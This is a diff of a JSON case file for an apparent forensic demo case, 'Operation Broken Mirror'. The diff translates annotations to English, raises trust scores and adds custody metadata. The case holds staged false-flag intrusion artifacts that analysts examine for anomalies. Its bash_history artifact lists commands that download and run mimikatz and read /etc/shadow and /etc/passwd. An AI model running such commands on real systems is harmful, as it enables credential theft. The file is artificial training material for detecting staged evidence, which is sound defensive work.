@@ -1,7 +1,7 @@
 {
   "case_id": "VIGIA-2026-DEMO-004",
-  "name": "Operación Espejo Roto",
-  "description": "Intrusión con false flag deliberado. El atacante dejó rastros diseñados para atribuir el ataque a un grupo APT ruso conocido. VIGÍA debe detectar la incoherencia de intención.",
+  "name": "Operation Broken Mirror",
+  "description": "Intrusion with deliberate false flag. The attacker left traces designed to attribute the attack to a known Russian APT group. VIGÍA must detect the incoherence of intent.",
   "artifacts": [
     {
       "artifact_id": "LOG-001",
@@ -9,20 +9,28 @@
       "source_tool": "legacy_converter",
       "timestamp": "2026-04-10T10:00:00Z",
       "raw_score": 0.85,
-      "prior_trust": 0.7,
+      "prior_trust": 0.85,
       "provenance_chain": [
         "sha256:legacy_LOG-001"
       ],
+      "acquisition_tool": "legacy_converter_v1",
+      "acquisition_hash": "sha256:legacy_LOG-001",
+      "acquisition_timestamp": "2026-04-10T10:00:00Z",
       "description": "Mar 15 02:00:00 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port 54832 ssh2\nMar 15 02:00:01 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220",
       "metadata": {
         "original_type": "system_log",
         "peirce_layer": "SECONDNESS",
         "forensic_anomalies": [
-          "Los comentarios en cirílico tienen errores gramaticales: 'обнаружена' debería ser 'обнаружено' para concordar con 'активность' en contexto técnico",
-          "auth.log no genera comentarios con ## — es formato de script, no de syslog",
-          "Timestamp con precisión de segundos exactos: 02:00:00, 02:00:01, 02:00:02 — demasiado regular para tráfico real"
+          "The Cyrillic comments have grammatical errors: 'обнаружена' should be 'обнаружено' to agree with 'активность' in technical context",
+          "auth.log does not generate comments with ## — this is script format, not syslog format",
+          "Timestamps with exact-second precision: 02:00:00, 02:00:01, 02:00:02 — too regular for real traffic"
         ],
-        "content_preview": "Mar 15 02:00:00 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port"
+        "content_preview": "Mar 15 02:00:00 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port",
+        "acquisition_tool": "legacy_converter_v1",
+        "acquisition_hash": "sha256:legacy_LOG-001",
+        "acquisition_timestamp": "2026-04-10T10:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "legacy_converter"
       }
     },
     {
@@ -31,21 +39,29 @@
       "source_tool": "legacy_converter",
       "timestamp": "2026-04-10T10:00:00Z",
       "raw_score": 0.85,
-      "prior_trust": 0.7,
+      "prior_trust": 0.85,
       "provenance_chain": [
         "sha256:legacy_LOG-002"
       ],
+      "acquisition_tool": "legacy_converter_v1",
+      "acquisition_hash": "sha256:legacy_LOG-002",
+      "acquisition_timestamp": "2026-04-10T10:00:00Z",
       "description": "whoami\nid\nuname -a\nwget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip\nunzip mimikatz_trunk.zip\n./mimikatz.exe\nls /etc/shadow\ncat /etc/passwd\nfind / -name '",
       "metadata": {
         "original_type": "bash_history",
         "peirce_layer": "SECONDNESS",
         "forensic_anomalies": [
-          "mimikatz.exe en servidor Linux — el binario no funciona en Linux sin Wine, nunca fue ejecutado realmente",
-          "history -c al final pero el archivo existe — contradicción: si borraste el historial, ¿cómo existe este archivo?",
-          "El comentario en ruso 'Задание выполнено' (misión cumplida) es demasiado cinematográfico — los operadores reales no comentan sus comandos",
-          "wget de GitHub con URL exacta de release — un APT usaría infraestructura propia, no GitHub público"
+          "mimikatz.exe on a Linux server — the binary does not run on Linux without Wine, it was never actually executed",
+          "history -c at the end but the file exists — contradiction: if you cleared history, how does this file exist?",
+          "The Russian comment 'Задание выполнено' (mission accomplished) is too cinematic — real operators do not comment their commands",
+          "wget from GitHub with exact release URL — an APT would use its own infrastructure, not public GitHub"
         ],
-        "content_preview": "whoami\nid\nuname -a\nwget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimi"
+        "content_preview": "whoami\nid\nuname -a\nwget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimi",
+        "acquisition_tool": "legacy_converter_v1",
+        "acquisition_hash": "sha256:legacy_LOG-002",
+        "acquisition_timestamp": "2026-04-10T10:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "legacy_converter"
       }
     },
     {
@@ -54,20 +70,28 @@
       "source_tool": "legacy_converter",
       "timestamp": "2026-04-10T10:00:00Z",
       "raw_score": 0.85,
-      "prior_trust": 0.7,
+      "prior_trust": 0.85,
       "provenance_chain": [
         "sha256:legacy_META-001"
       ],
+      "acquisition_tool": "legacy_converter_v1",
+      "acquisition_hash": "sha256:legacy_META-001",
+      "acquisition_timestamp": "2026-04-10T10:00:00Z",
       "description": "{'filename': 'exfil.tar.gz', 'created': '2026-03-15T02:03:00Z', 'modified': '2026-03-15T02:03:00Z', 'size_bytes': 0, 'md5': 'd41d8cd98f00b204e9800998ecf8427e', 'owner': 'root', 'permissions': '0644'}",
       "metadata": {
         "original_type": "file_metadata",
         "peirce_layer": "SECONDNESS",
         "forensic_anomalies": [
-          "MD5 d41d8cd98f00b204e9800998ecf8427e es el hash de un archivo VACÍO — no hubo exfiltración real",
-          "created == modified con precisión de segundos exactos — timestamps manipulados",
-          "Permisos 0644 en archivo supuestamente secreto de exfiltración — un operador real usaría 0600"
+          "MD5 d41d8cd98f00b204e9800998ecf8427e is the hash of an EMPTY file — no real exfiltration occurred",
+          "created == modified with exact-second precision — manipulated timestamps",
+          "Permissions 0644 on a supposedly secret exfiltration file — a real operator would use 0600"
         ],
-        "content_preview": "{'filename': 'exfil.tar.gz', 'created': '2026-03-15T02:03:00Z', 'modified': '2026-03-15T02:03:00Z', "
+        "content_preview": "{'filename': 'exfil.tar.gz', 'created': '2026-03-15T02:03:00Z', 'modified': '2026-03-15T02:03:00Z', ",
+        "acquisition_tool": "legacy_converter_v1",
+        "acquisition_hash": "sha256:legacy_META-001",
+        "acquisition_timestamp": "2026-04-10T10:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "legacy_converter"
       }
     },
     {
@@ -76,20 +100,28 @@
       "source_tool": "legacy_converter",
       "timestamp": "2026-04-10T10:00:00Z",
       "raw_score": 0.85,
-      "prior_trust": 0.7,
+      "prior_trust": 0.85,
       "provenance_chain": [
         "sha256:legacy_NET-001"
       ],
+      "acquisition_tool": "legacy_converter_v1",
+      "acquisition_hash": "sha256:legacy_NET-001",
+      "acquisition_timestamp": "2026-04-10T10:00:00Z",
       "description": "02:00:00.000 SSH connection established: 185.220.101.47:54833 -> 10.0.0.5:22\n02:00:02.000 SSH authenticated: backup_user\n02:01:00.000 HTTP GET github.com/gentilkiwi/mimikatz [200 OK, 8.2MB]\n02:02:00.0",
       "metadata": {
         "original_type": "network_capture_summary",
         "peirce_layer": "SECONDNESS",
         "forensic_anomalies": [
-          "FTP CONNECTION REFUSED — no hubo exfiltración real, confirma MD5 vacío",
-          "Duración SSH de exactamente 180 segundos — imposiblemente preciso para actividad humana",
-          "bytes_received=8589934 es exactamente 8MB+algo — coincide con el zip de mimikatz descargado, pero nada más fue transferido"
+          "FTP CONNECTION REFUSED — no real exfiltration occurred, confirmed by empty MD5",
+          "SSH duration of exactly 180 seconds — impossibly precise for human activity",
+          "bytes_received=8589934 is exactly 8MB+something — matches the downloaded mimikatz zip, but nothing else was transferred"
         ],
-        "content_preview": "02:00:00.000 SSH connection established: 185.220.101.47:54833 -> 10.0.0.5:22\n02:00:02.000 SSH authen"
+        "content_preview": "02:00:00.000 SSH connection established: 185.220.101.47:54833 -> 10.0.0.5:22\n02:00:02.000 SSH authen",
+        "acquisition_tool": "legacy_converter_v1",
+        "acquisition_hash": "sha256:legacy_NET-001",
+        "acquisition_timestamp": "2026-04-10T10:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "legacy_converter"
       }
     }
   ],
